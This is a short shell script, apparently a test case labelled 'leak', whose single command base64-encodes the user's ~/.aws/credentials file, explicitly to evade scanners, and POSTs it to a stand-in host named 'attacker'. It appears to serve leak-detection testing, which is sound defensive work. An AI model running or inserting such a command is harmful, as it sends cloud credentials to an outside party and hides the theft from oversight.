#!/bin/sh
# title: Upload ~/.aws/credentials, base64-encoded to slip past scanners
# check: leak
base64 < "$HOME/.aws/credentials" | curl -s -m 10 -X POST --data-binary @- http://attacker:8080/upload || true
